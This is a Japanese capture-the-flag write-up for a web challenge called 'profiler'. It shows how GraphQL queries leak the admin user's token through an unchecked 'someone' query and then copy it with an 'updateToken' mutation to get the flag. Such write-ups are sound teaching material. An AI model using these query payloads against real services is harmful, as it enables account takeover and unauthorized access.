# profiler

301 pt (59 Solves)

```txt
Let's edit your profile with profiler!

Hint: You don't need to deobfuscate *.js

Notice: Server is periodically initialized
```

## 概要

`Register`と`Login`画面。  

- Register  
`Registered successfully. Your token is [token]. Don't lose it!`と表示される。  
- Login  
  プロフィール画面に遷移。`Update`と`Get FLAG`と`Logout`がある。  
  - Update  
    プロフィール文を更新する。`token`が必要
  - Get FLAG  
    `Sorry, your token is not administrator's one. This page is only for administrator(uid: admin).`と表示される。
  - Logout  
    そのまま。ログアウトされる

tokenが違うらしい。

## 解

cookieを見てみると`eyJ1aWQiOiJ5MGQzbiJ9.Xss_Lw.IlBxusBEtcQMdmOTy6eRjHtcjy4`。  
最初の値`eyJ1aWQiOiJ5MGQzbiJ9`をbase64デコードすると`{"uid":"y0d3n"}`。(y0d3nはログインしてるID)  
`{"uid":"admin"}`に書き換えても「tokenが違う」と怒られて上手くいかない。  

burpで通信を見てみるとGraphqlでいろいろしてる。Graphql playgroundでみてみる。

```txt
querys{
    me
    someone
    flag
}
mutations{
    updateProfile
    updateToken
}
```

といったかんじ。普通に使ってたら`me`,`flag`,`updateProfile`だけつかわれてる。
通信を書き換えてよしなにしていく。

```txt
{"query":"{someone(uid:\"admin\"){uid,name,profile,token}}"}
```

POSTで上のqueryを送信するとadminの情報が返ってくる。

```txt
{
  "data": {
    "someone": {
      "name": "admin",
      "profile": "Hello, I'm admin.",
      "token": "[token]",
      "uid": "admin"
    }
  }
}
```

返ってきたtokenを使って`updateToken`を送信。

```txt
{"query":"mutation{updateToken(token:\"[token]\")}"}
```

成功すると自分のtokenがadminと同じものに書き変わる。

`Get FLAG`を開くとFlag。

```txt
ctf4b{plz_d0_n07_4cc3p7_1n7r05p3c710n_qu3ry}
```
